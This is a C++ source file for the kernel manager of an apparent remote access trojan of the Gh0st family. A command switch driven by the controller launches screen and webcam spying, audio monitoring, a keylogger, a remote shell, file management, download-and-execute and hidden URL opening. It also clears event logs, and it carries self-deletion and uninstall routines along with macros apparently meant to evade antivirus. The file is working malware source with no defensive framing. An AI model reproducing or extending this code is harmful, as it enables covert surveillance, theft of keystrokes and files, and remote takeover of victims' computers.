// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "StdAfx.h"
#include <shlwapi.h>
#include "KernelManager.h"
#include "loop.h"
#include "until.h"
// #include "DDOSManager.h"

#include <Tlhelp32.h>
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
// extern BOOL Stoping;

extern MODIFY_DATA modify_data;

TCHAR temp_proc[1024]={0};
BOOL proc_tag = false;
char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;
CKernelManager::CKernelManager(CClientSocket *pClient,LPCTSTR lpszKillEvent, LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
	if (lpszKillEvent != NULL)
		lstrcpy(m_strKillEvent, lpszKillEvent);
	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_nThreadCount = 0;
	// 初次连接，控制端发送命令表示激活
	m_bIsActived = false;

}

CKernelManager::~CKernelManager()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}

// 加上激活
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:
		InterlockedExchange((LONG *)&m_bIsActived, true);
		break;
//	case COMMAND_DDOS_ATTACK:
//		{
//			ATTACK m_Attack;
//			memcpy(&m_Attack,lpBuffer + 1,sizeof(ATTACK));
//			DDOSManager m_DDOSManager(&m_Attack);
//		}
//		break;
//	case COMMAND_DDOS_STOP:
//		Stoping = FALSE;
//		Sleep(100);
// 		break;
	case COMMAND_LIST_DRIVE: // 文件管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
		break;
	case COMMAND_SCREEN_SPY: // 屏幕查看
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_WEBCAM: // 摄像头
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_VideoManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SYSINFO: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SysInfoManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_AUDIO: // 音频监听
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SHELL: // 远程sehll
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_KEYBOARD: //键盘记录
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SYSTEM: //系统管理，包括进程，窗口
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SENDMSG:
		{
			CloseHandle(CreateThread(NULL,NULL,Loop_MsgBox,&lpBuffer[1],NULL,NULL));
			Sleep(500);
		}
		break;
	case COMMAND_DOWN_EXEC: // 下载者
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		Sleep(100); // 传递参数用
		break;
	case COMMAND_OPEN_URL_SHOW: // 显示打开网页
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
		break;
	case COMMAND_OPEN_URL_HIDE: // 隐藏打开网页
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
		break;
	case COMMAND_REMOVE: // 卸载,
		UnInstallService();
		break;
	case COMMAND_CLEAN_EVENT: // 清除日志
		CleanEvent();
		break;
	case COMMAND_SESSION://会话管理
		CSystemManager::ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_RENAME_REMARK: // 改备注
		SetHostID((LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_CHANGE_GROUP: // 改分组
		SetInfo(modify_data.szGetGroup, (LPCTSTR)(lpBuffer + 1), "BITS");
		break;
	case COMMAND_UPDATE_SERVER: // 更新服务端
		if (UpdateServer((char *)lpBuffer + 1))
			UnInstallService();
		break;
	case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包
		break;
	}		
}

BOOL DeleteMyserlf()
{
	TCHAR szModule [MAX_PATH],
		szComspec[MAX_PATH],
		szParams [MAX_PATH];
	
	// get file path names:
	if((GetModuleFileName(0,szModule,MAX_PATH)!=0) &&
		(GetShortPathName(szModule,szModule,MAX_PATH)!=0) &&
		(GetEnvironmentVariable("COMSPEC",szComspec,MAX_PATH)!=0))
	{
		// set command shell parameters
		lstrcpy(szParams," /c del ");
		lstrcat(szParams, szModule);
		lstrcat(szParams, " > nul");
		lstrcat(szComspec, szParams);
		FUCKAV2
			FUCKAV2
			FUCKAV2
			FUCKAV2
			ANTIVIRUS
			FUCKNOD32
	FUCKAV
		// set struct members
		STARTUPINFO		si={0};
		PROCESS_INFORMATION	pi={0};
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
		
		// increase resource allocation to program
		SetPriorityClass(GetCurrentProcess(),
			REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentThread(),
			THREAD_PRIORITY_TIME_CRITICAL);
		
		// invoke command shell
		if(CreateProcess(0, szComspec, 0, 0, 0,CREATE_SUSPENDED|
			DETACHED_PROCESS, 0, 0, &si, &pi))
		{
			// suppress command shell process until program exits
			SetPriorityClass(pi.hProcess,IDLE_PRIORITY_CLASS);
			SetThreadPriority(pi.hThread,THREAD_PRIORITY_IDLE); 
			
			// resume shell process with new low priority
			ResumeThread(pi.hThread);
			
			// everything seemed to work
			return TRUE;
		}
		else // if error, normalize allocation
		{
			SetPriorityClass(GetCurrentProcess(),
				NORMAL_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentThread(),
				THREAD_PRIORITY_NORMAL);
		}
	}
	return FALSE;
}
#include <shlobj.h>
void CKernelManager::UnInstallService()
{	
	if (!modify_data.bRunOnce)
	{
		char	strInstallModule[MAX_PATH]; 
		memset(strInstallModule, 0, sizeof(strInstallModule)); 
		GetModuleFileName(NULL,strInstallModule,sizeof(strInstallModule));
// 		char cirLl[] = {'S','o','f','t','w','a','r','e','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','R','u','n','\0'};
// 		WriteRegEx(HKEY_LOCAL_MACHINE, cirLl, "SVCSHOST", REG_SZ, (char *)strInstallModule, lstrlen(strInstallModule), 3);
		TCHAR   szPath[MAX_PATH];
		SHGetSpecialFolderPath(NULL, szPath, CSIDL_STARTUP, FALSE);
		TCHAR buf3[MAX_PATH];
		char FileName[80];
		wsprintf(FileName,"%s.exe",modify_data.szGetGroup);
		wsprintf(buf3, "%s\\%s", szPath, FileName);
		
		char	strTmpPathQ[MAX_PATH];
		char	strRandomFileQ[MAX_PATH];
		GetTempPath(sizeof(strTmpPathQ), strTmpPathQ);
		wsprintf(strRandomFileQ, "%s\\%x.sg", strTmpPathQ, GetTickCount()+57);
		MoveFile(buf3, strRandomFileQ);
		MoveFileEx(strRandomFileQ, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
		SetFileAttributes(szPath, FILE_ATTRIBUTE_NORMAL); 

		char	*ServerA = NULL;
		ServerA = modify_data.SerName;
		SC_HANDLE service, scm;
		scm = OpenSCManager(0, 0,SC_MANAGER_CREATE_SERVICE);
		service = OpenService(scm, ServerA,SERVICE_ALL_ACCESS | DELETE);
		DeleteService(service);
	}

	TCHAR	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	char keylog[] = {'\\','o','u','r','l','o','g','.','d','a','t','\0'};
	lstrcat(strRecordFile, keylog);
	DeleteFile(strRecordFile);
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV

	DelSetInfo(modify_data.szGetGroup, modify_data.szGroup, "BITS");//写分组信息

	DeleteMyserlf();
	
	exit(0);
	ExitProcess(0);
}

bool CKernelManager::IsActived()
{
	return	m_bIsActived;	
}